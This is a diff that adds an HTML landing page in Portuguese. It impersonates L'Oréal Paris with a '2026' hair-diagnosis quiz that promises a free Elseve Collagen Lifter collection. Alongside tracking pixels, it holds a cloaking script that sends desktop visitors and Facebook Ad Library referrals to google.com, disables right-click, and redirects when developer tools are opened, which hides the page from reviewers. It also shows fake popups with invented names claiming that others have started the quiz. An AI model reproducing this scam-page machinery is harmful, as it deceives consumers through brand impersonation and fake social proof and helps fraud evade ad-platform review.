@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  
+    <meta charset="UTF-8" />
+  <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<script>
+/**
+ * UTM Shield v1.0 (blindado)
+ * - Persiste UTM/clickid em cookie + localStorage (90 dias)
+ * - Cria UTMs quando não há
+ * - Reaplica UTMs na URL (sem reload)
+ * - Decora links internos e forms (hidden inputs)
+ */
+(function () {
+  "use strict";
+
+  var CONFIG = {
+    cookieDays: 90,
+    cookiePrefix: "__trk_",
+    storageKey: "__trk_payload_v1",
+    // Se true, sempre mantém a URL “limpa” e só passa UTMs por link/form (não recomendo).
+    keepUrlClean: false,
+    // Se true, sempre reescreve a URL para incluir UTMs persistidas quando não existirem na URL atual.
+    rewriteUrlIfMissing: true,
+    // Se quiser limitar domínios (ex: multi-domínio), coloque aqui. Vazio = só mesmo hostname.
+    allowedHostnames: [], // ex: ["seusite.com", "checkout.seusite.com"]
+    debug: false
+  };
+
+  var TRACK_KEYS = [
+    "utm_source","utm_medium","utm_campaign","utm_content","utm_term","utm_id",
+    "fbclid","gclid","ttclid","msclkid"
+  ];
+
+  function log() {
+    if (CONFIG.debug && window.console) console.log.apply(console, arguments);
+  }
+
+  function daysToMs(days) { return days * 24 * 60 * 60 * 1000; }
+
+  function setCookie(name, value, days) {
+    try {
+      var expires = new Date(Date.now() + daysToMs(days)).toUTCString();
+      document.cookie =
+        name + "=" + encodeURIComponent(value) +
+        "; expires=" + expires +
+        "; path=/" +
+        "; SameSite=Lax";
+    } catch (e) {}
+  }
+
+  function getCookie(name) {
+    try {
+      var match = document.cookie.match(new RegExp("(^| )" + name.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, "\\$&") + "=([^;]+)"));
+      return match ? decodeURIComponent(match[2]) : "";
+    } catch (e) {
+      return "";
+    }
+  }
+
+  function safeJsonParse(str) {
+    try { return JSON.parse(str); } catch (e) { return null; }
+  }
+
+  function getQueryParams() {
+    var params = {};
+    var sp = new URLSearchParams(window.location.search);
+    sp.forEach(function (v, k) { params[k] = v; });
+    return params;
+  }
+
+  function pickTrackingFrom(obj) {
+    var out = {};
+    TRACK_KEYS.forEach(function (k) {
+      if (obj && obj[k] != null && String(obj[k]).trim() !== "") out[k] = String(obj[k]).trim();
+    });
+    return out;
+  }
+
+  function nowIso() {
+    try { return new Date().toISOString(); } catch(e) { return "" + Date.now(); }
+  }
+
+  function getReferrerHost() {
+    try {
+      if (!document.referrer) return "";
+      return (new URL(document.referrer)).hostname || "";
+    } catch (e) {
+      return "";
+    }
+  }
+
+  function normalizeSource(host) {
+    if (!host) return "";
+    return host.replace(/^www\./i, "").toLowerCase();
+  }
+
+  function createUtmIfMissing(existing) {
+    var utm = existing || {};
+    // Se já tem utm_source e utm_medium, não inventa.
+    if (utm.utm_source && utm.utm_medium) return utm;
+
+    var refHost = normalizeSource(getReferrerHost());
+    var hasRef = !!refHost && refHost !== normalizeSource(location.hostname);
+
+    // Baseado em click IDs (prioridade alta)
+    if (utm.gclid && !utm.utm_source) {
+      utm.utm_source = "google";
+      utm.utm_medium = utm.utm_medium || "cpc";
+      utm.utm_campaign = utm.utm_campaign || "(auto)";
+    } else if (utm.fbclid && !utm.utm_source) {
+      utm.utm_source = "facebook";
+      utm.utm_medium = utm.utm_medium || "paid_social";
+      utm.utm_campaign = utm.utm_campaign || "(auto)";
+    } else if (utm.ttclid && !utm.utm_source) {
+      utm.utm_source = "tiktok";
+      utm.utm_medium = utm.utm_medium || "paid_social";
+      utm.utm_campaign = utm.utm_campaign || "(auto)";
+    } else if (utm.msclkid && !utm.utm_source) {
+      utm.utm_source = "bing";
+      utm.utm_medium = utm.utm_medium || "cpc";
+      utm.utm_campaign = utm.utm_campaign || "(auto)";
+    } else if (hasRef) {
+      // Referral
+      utm.utm_source = utm.utm_source || refHost;
+      utm.utm_medium = utm.utm_medium || "referral";
+      utm.utm_campaign = utm.utm_campaign || "(referral)";
+    } else {
+      // Direct
+      utm.utm_source = utm.utm_source || "direct";
+      utm.utm_medium = utm.utm_medium || "none";
+      utm.utm_campaign = utm.utm_campaign || "(direct)";
+    }
+
+    return utm;
+  }
+
+  function loadPayload() {
+    // Prefer localStorage, fallback cookie
+    var ls = null;
+    try { ls = safeJsonParse(localStorage.getItem(CONFIG.storageKey) || ""); } catch(e) {}
+    if (ls && ls.data) return ls;
+
+    var ck = getCookie(CONFIG.cookiePrefix + "payload");
+    var parsed = safeJsonParse(ck);
+    if (parsed && parsed.data) return parsed;
+
+    return null;
+  }
+
+  function savePayload(payload) {
+    try { localStorage.setItem(CONFIG.storageKey, JSON.stringify(payload)); } catch(e) {}
+    setCookie(CONFIG.cookiePrefix + "payload", JSON.stringify(payload), CONFIG.cookieDays);
+  }
+
+  function mergeTracking(base, incoming) {
+    var out = Object.assign({}, base || {});
+    Object.keys(incoming || {}).forEach(function (k) {
+      // Incoming sempre sobrescreve (last-touch)
+      out[k] = incoming[k];
+    });
+    return out;
+  }
+
+  function ensureFirstTouch(payload, incoming) {
+    // Salva first_touch apenas na primeira vez
+    if (!payload.first_touch || !payload.first_touch.utm_source) {
+      payload.first_touch = Object.assign({}, incoming);
+      payload.first_touch_at = nowIso();
+    }
+  }
+
+  function isInternalUrl(url) {
+    try {
+      var u = new URL(url, location.href);
+      if (u.protocol !== "http:" && u.protocol !== "https:") return false;
+      var host = normalizeSource(u.hostname);
+      var myHost = normalizeSource(location.hostname);
+
+      // Se houver allowlist, usa ela. Caso contrário, só mesmo host.
+      if (CONFIG.allowedHostnames && CONFIG.allowedHostnames.length) {
+        return CONFIG.allowedHostnames.map(normalizeSource).includes(host);
+      }
+      return host === myHost;
+    } catch (e) {
+      return false;
+    }
+  }
+
+  function buildQueryString(params) {
+    var sp = new URLSearchParams();
+    Object.keys(params || {}).forEach(function (k) {
+      if (params[k] != null && String(params[k]).trim() !== "") sp.set(k, String(params[k]));
+    });
+    var s = sp.toString();
+    return s ? ("?" + s) : "";
+  }
+
+  function getPersistedTracking(payload) {
+    return (payload && payload.data) ? payload.data : {};
+  }
+
+  function rewriteUrlIfNeeded(persisted) {
+    if (CONFIG.keepUrlClean) return;
+    if (!CONFIG.rewriteUrlIfMissing) return;
+
+    var current = getQueryParams();
+    var currentTrack = pickTrackingFrom(current);
+
+    // Se já tem utm_source/utm_medium na URL, não mexe.
+    if (currentTrack.utm_source || currentTrack.utm_medium) return;
+
+    // Se não tem nada persistido, também não mexe.
+    if (!persisted || (!persisted.utm_source && !persisted.utm_medium)) return;
+
+    try {
+      var url = new URL(location.href);
+
+      // Mantém params atuais e adiciona tracking persistido
+      TRACK_KEYS.forEach(function (k) {
+        if (!url.searchParams.get(k) && persisted[k]) url.searchParams.set(k, persisted[k]);
+      });
+
+      history.replaceState({}, "", url.toString());
+      log("[UTM] URL reescrita com UTMs persistidas:", url.toString());
+    } catch (e) {}
+  }
+
+  function decorateLinks(persisted) {
+    if (!persisted) return;
+
+    var links = document.querySelectorAll("a[href]");
+    links.forEach(function (a) {
+      var href = a.getAttribute("href");
+      if (!href) return;
+
+      // Ignora âncoras, tel, mailto, javascript
+      if (href.startsWith("#") || href.startsWith("mailto:") || href.startsWith("tel:") || href.startsWith("javascript:")) return;
+
+      // Só link interno
+      if (!isInternalUrl(href)) return;
+
+      try {
+        var u = new URL(href, location.href);
+
+        // Só adiciona se não existir na URL do link
+        TRACK_KEYS.forEach(function (k) {
+          if (!u.searchParams.get(k) && persisted[k]) u.searchParams.set(k, persisted[k]);
+        });
+
+        a.setAttribute("href", u.toString());
+      } catch (e) {}
+    });
+  }
+
+  function ensureHiddenInput(form, name, value) {
+    if (!value) return;
+    var input = form.querySelector('input[name="' + name + '"]');
+    if (!input) {
+      input = document.createElement("input");
+      input.type = "hidden";
+      input.name = name;
+      form.appendChild(input);
+    }
+    input.value = value;
+  }
+
+  function decorateForms(persisted) {
+    if (!persisted) return;
+
+    var forms = document.querySelectorAll("form");
+    forms.forEach(function (form) {
+      // Hidden inputs
+      TRACK_KEYS.forEach(function (k) {
+        ensureHiddenInput(form, k, persisted[k]);
+      });
+
+      // Se o form tiver action interna, também decora a action
+      var action = form.getAttribute("action");
+      if (action && isInternalUrl(action)) {
+        try {
+          var u = new URL(action, location.href);
+          TRACK_KEYS.forEach(function (k) {
+            if (!u.searchParams.get(k) && persisted[k]) u.searchParams.set(k, persisted[k]);
+          });
+          form.setAttribute("action", u.toString());
+        } catch (e) {}
+      }
+    });
+  }
+
+  function runDecoration(payload) {
+    var persisted = getPersistedTracking(payload);
+    rewriteUrlIfNeeded(persisted);
+    decorateLinks(persisted);
+    decorateForms(persisted);
+  }
+
+  // ---- MAIN ----
+  var urlParams = getQueryParams();
+  var incomingTrack = pickTrackingFrom(urlParams);
+
+  // Carrega o que já existe
+  var payload = loadPayload() || {
+    created_at: nowIso(),
+    first_touch: null,
+    first_touch_at: null,
+    last_touch_at: null,
+    data: {}
+  };
+
+  // Se chegou tracking novo pela URL, salva last-touch
+  if (Object.keys(incomingTrack).length) {
+    // Se veio só fbclid/gclid sem utm, cria utm automaticamente antes de salvar
+    incomingTrack = createUtmIfMissing(incomingTrack);
+
+    ensureFirstTouch(payload, incomingTrack);
+    payload.data = mergeTracking(payload.data, incomingTrack);
+    payload.last_touch_at = nowIso();
+    savePayload(payload);
+
+    log("[UTM] Capturado da URL e persistido:", payload);
+  } else {
+    // Se não veio nada e não tem persistido, cria UTM agora (referrer/direct)
+    var persisted = getPersistedTracking(payload);
+    if (!persisted || (!persisted.utm_source && !persisted.utm_medium)) {
+      var auto = createUtmIfMissing({});
+      ensureFirstTouch(payload, auto);
+      payload.data = mergeTracking(payload.data, auto);
+      payload.last_touch_at = nowIso();
+      savePayload(payload);
+
+      log("[UTM] Criado automático e persistido:", payload);
+    }
+  }
+
+  // Decora tudo no DOM
+  function onReady(fn) {
+    if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", fn);
+    else fn();
+  }
+
+  onReady(function () {
+    var fresh = loadPayload() || payload;
+    runDecoration(fresh);
+
+    // Se seu site injeta conteúdo via JS (SPA), rode isso depois de renderizar:
+    // window.__UTM_SHIELD_REFRESH__();
+    window.__UTM_SHIELD_REFRESH__ = function () {
+      var p = loadPayload() || payload;
+      runDecoration(p);
+      return p;
+    };
+  });
+
+})();
+</script>
+
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+
+  ttq.load('D6CAT23C77U0SFL8IK90');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+
+  <script>
+(function () {
+
+  /* 💻 Detecta PC real */
+  function isDesktop() {
+    const ua = navigator.userAgent.toLowerCase();
+    return (
+      ua.includes("windows nt") ||
+      ua.includes("macintosh") ||
+      ua.includes("linux x86_64")
+    );
+  }
+
+  /* 📚 Detecta Biblioteca de Anúncios do Facebook (PC) */
+  function bibliotecaFacebook() {
+    const ref = document.referrer.toLowerCase();
+    return ref.includes("facebook.com") && isDesktop();
+  }
+
+  /* 🚫 BLOQUEIOS PRINCIPAIS */
+  if (isDesktop() || bibliotecaFacebook()) {
+    window.location.replace("https://www.google.com/");
+  }
+
+  /* 🚫 Bloqueia botão direito (PC) */
+  document.addEventListener("contextmenu", function (e) {
+    if (isDesktop()) e.preventDefault();
+  });
+
+  /* 🚫 Bloqueia inspeção no PC */
+  document.addEventListener("keydown", function (e) {
+    if (!isDesktop()) return;
+
+    if (
+      e.key === "F12" ||
+      (e.ctrlKey && e.shiftKey && ["i","c","j"].includes(e.key.toLowerCase())) ||
+      (e.ctrlKey && e.key.toLowerCase() === "u")
+    ) {
+      e.preventDefault();
+      window.location.replace("https://www.google.com/");
+    }
+  });
+
+})();
+</script>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1198118175743375');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1198118175743375&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+ 
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+    <title>L'Oréal Paris | The 2026 Experience</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Poppins:wght@200;400;600;800&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --white: #FFFFFF;
+            --purple-deep: #050208;
+            --purple-glow: #2D0A4E;
+            --accent: #B56BFF;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: var(--purple-deep);
+            color: var(--white);
+            /* CORREÇÃO: min-height em vez de height fixo e permitir scroll */
+            min-height: 100vh;
+            overflow-x: hidden;
+            overflow-y: auto; 
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Fundo fixo para não quebrar no scroll */
+        .universe {
+            position: fixed; 
+            inset: 0; 
+            z-index: -1;
+            background: 
+                radial-gradient(circle at 50% -20%, var(--purple-glow) 0%, transparent 50%),
+                radial-gradient(circle at 0% 100%, #1A082E 0%, transparent 40%);
+        }
+
+        .light-beam {
+            position: fixed; /* Mudado para fixed para acompanhar a tela */
+            top: 0; left: 50%;
+            width: 1px; height: 100vh;
+            background: linear-gradient(to bottom, transparent, rgba(255,255,255,0.1), transparent);
+            transform: translateX(-50%);
+            z-index: -1;
+        }
+
+        /* ========= CABEÇALHO ========= */
+        header {
+            padding: 40px 20px 20px;
+            text-align: center;
+            flex-shrink: 0;
+        }
+
+        .logo-loreal {
+            font-family: 'Cinzel', serif;
+            font-size: clamp(24px, 8vw, 34px); /* Tamanho adaptável */
+            letter-spacing: 15px;
+            font-weight: 400;
+            text-shadow: 0 0 30px rgba(255,255,255,0.3);
+            margin-right: -15px;
+        }
+
+        .quiz-tag-top {
+            font-size: 10px;
+            letter-spacing: 5px;
+            text-transform: uppercase;
+            color: var(--accent);
+            font-weight: 600;
+            margin-top: 5px;
+            opacity: 0.8;
+        }
+
+        /* ========= CENA DOS PRODUTOS ========= */
+        .product-stage {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            min-height: 350px; /* Garante espaço para os produtos */
+            padding: 20px 0;
+        }
+
+        .product-aura {
+            position: absolute;
+            width: 300px; height: 300px;
+            background: radial-gradient(circle, rgba(181, 107, 255, 0.15) 0%, transparent 70%);
+            border-radius: 50%;
+            animation: pulseAura 4s infinite ease-in-out;
+        }
+
+        @keyframes pulseAura { 0%, 100% { opacity: 0.3; transform: scale(1); } 50% { opacity: 0.6; transform: scale(1.2); } }
+
+        .prod-float {
+            position: absolute;
+            filter: drop-shadow(0 25px 45px rgba(0,0,0,0.9));
+            animation: floatHero 6s infinite ease-in-out;
+            max-width: 30%; /* Responsividade das imagens */
+        }
+
+        .p-shampoo {
+            width: 100px;
+            left: 10%;
+            top: 15%;
+            animation-delay: 0s;
+        }
+
+        .p-cond {
+            width: 95px;
+            right: 10%;
+            top: 10%;
+            animation-delay: 1.5s;
+        }
+
+        .p-mask {
+            width: 170px;
+            z-index: 10;
+            position: relative; /* Mantém no centro do flex */
+            animation-delay: 0.8s;
+        }
+
+        @keyframes floatHero { 0%, 100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-20px) rotate(3deg); } }
+
+        /* ========= INTERFACE DO USUÁRIO ========= */
+        .ui-panel {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 40px 30px 40px;
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(40px);
+            -webkit-backdrop-filter: blur(40px);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 40px 40px 0 0;
+            text-align: center;
+            box-shadow: 0 -20px 50px rgba(0,0,0,0.5);
+            flex-shrink: 0; /* Impede que o painel seja esmagado */
+        }
+
+        .info-pill {
+            display: inline-block;
+            padding: 6px 15px;
+            background: rgba(181, 107, 255, 0.1);
+            border: 1px solid rgba(181, 107, 255, 0.3);
+            border-radius: 100px;
+            font-size: 9px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: var(--accent);
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: 200;
+            letter-spacing: 1px;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+        }
+
+        h1 b { font-weight: 800; color: var(--white); }
+
+        .cta-crystal {
+            width: 100%;
+            padding: 22px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 18px;
+            color: var(--white);
+            font-weight: 700;
+            font-size: 13px;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: 0.4s;
+            position: relative;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+
+        .cta-crystal:active { transform: scale(0.98); }
+
+        .cta-crystal:hover {
+            background: var(--white);
+            color: #000;
+            box-shadow: 0 0 30px rgba(255,255,255,0.3);
+        }
+
+        .cta-crystal::after {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: crystalShine 3s infinite;
+        }
+
+        @keyframes crystalShine { 0% { left: -100%; } 100% { left: 100%; } }
+
+        .footer-minimal {
+            margin-top: 25px;
+            font-size: 9px;
+            letter-spacing: 3px;
+            opacity: 0.4;
+            text-transform: uppercase;
+        }
+
+        /* Notificações */
+        #notif-system { position: fixed; top: 30px; left: 20px; z-index: 10000; pointer-events: none; }
+        .notif-bubble {
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(10px);
+            padding: 10px 18px;
+            border-radius: 100px;
+            font-size: 10px;
+            border: 1px solid rgba(255,255,255,0.1);
+            animation: fadeIn 0.8s ease;
+            margin-bottom: 10px;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
+
+    </style>
+</head>
+<body>
+
+    <div class="universe"></div>
+    <div class="light-beam"></div>
+    <div id="notif-system"></div>
+
+    <header>
+        <div class="logo-loreal">L’ORÉAL</div>
+        <div class="quiz-tag-top">Quiz 2026</div>
+    </header>
+
+    <main class="product-stage">
+        <div class="product-aura"></div>
+        
+        <img src="https://www.loreal-paris.com.br/-/media/project/loreal/brand-sites/oap/americas/br/products/hair/hair-care/elseve/2025/collagen-lifter/packs/collagen-lifter-shampoo-200ml-v2.png" 
+             class="prod-float p-shampoo" alt="Shampoo">
+        
+        <img src="https://www.loreal-paris.com.br/-/media/project/loreal/brand-sites/oap/americas/br/products/hair/hair-care/elseve/2025/collagen-lifter/packs/collagen-lifter-tratamento-300g-v2.png" 
+             class="prod-float p-mask" alt="Tratamento">
+
+        <img src="https://www.loreal-paris.com.br/-/media/project/loreal/brand-sites/oap/americas/br/products/hair/hair-care/elseve/2025/collagen-lifter/packs/collagen-lifter-condicionador-200ml.png" 
+             class="prod-float p-cond" alt="Condicionador">
+    </main>
+
+    <section class="ui-panel">
+        <div class="info-pill">Duração estimada: 5 minutos</div>
+        <h1>Diagnóstico <b>Molecular</b></h1>
+        <p style="font-size: 14px; opacity: 0.7; margin-bottom: 30px; font-weight: 300; line-height: 1.6;">
+            Identifique a arquitetura do seu fio e resgate sua coleção Elseve Collagen Lifter ao finalizar o protocolo.
+        </p>
+
+        <button class="cta-crystal" onclick="init()">Iniciar Experiência</button>
+
+        <div class="footer-minimal">
+            © 2026 Recherche Avancée L’Oréal Paris
+        </div>
+    </section>
+
+    <script>
+        function init() {
+            try {
+                const audio = new Audio('https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3');
+                audio.play();
+            } catch(e) { console.log("Audio play blocked"); }
+
+            document.body.style.transition = "1s";
+            document.body.style.opacity = "0";
+            
+            setTimeout(() => {
+                const params = window.location.search;
+                // Certifica-te que o ficheiro index(1).html existe na mesma pasta
+                window.location.href = "index(1).html" + params;
+            }, 800);
+        }
+
+        function showPop() {
+            const system = document.getElementById('notif-system');
+            const names = ["Sophie", "Valentina", "Isabelle", "Camille", "Beatriz", "Mariana"];
+            const name = names[Math.floor(Math.random() * names.length)];
+            
+            const bubble = document.createElement('div');
+            bubble.className = 'notif-bubble';
+            bubble.innerHTML = `<b>${name}</b> iniciou o Quiz!`;
+            
+            system.appendChild(bubble);
+            
+            setTimeout(() => { 
+                bubble.style.opacity = '0';
+                setTimeout(() => bubble.remove(), 1000);
+            }, 4000);
+        }
+
+        // Primeira notificação após 3 segundos
+        setTimeout(showPop, 3000);
+        // Repete a cada 10 segundos
+        setInterval(showPop, 10000);
+    </script>
+</body>
+</html>
